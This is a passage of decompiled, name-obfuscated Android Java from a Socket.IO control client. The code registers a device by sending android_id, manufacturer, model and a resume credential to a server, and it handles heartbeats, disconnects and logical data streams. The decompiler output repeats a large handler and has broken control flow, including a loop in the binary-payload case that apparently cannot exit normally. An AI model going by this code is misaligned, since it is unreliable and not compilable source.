                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i4) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i5 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i5, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar5 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar5), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i5, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar6 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar6), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i6 = 0;
                                int i7 = 0;
                                bArr = null;
                                while (true) {
                                    if (i6 < length) {
                                        Object obj3 = objArr[i6];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i7++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i6++;
                                    } else if (i7 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i5 = 2;
            sVarA.c("disconnect", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i5) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i6 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i6, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar6 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar6), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i6, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar7 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar7), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
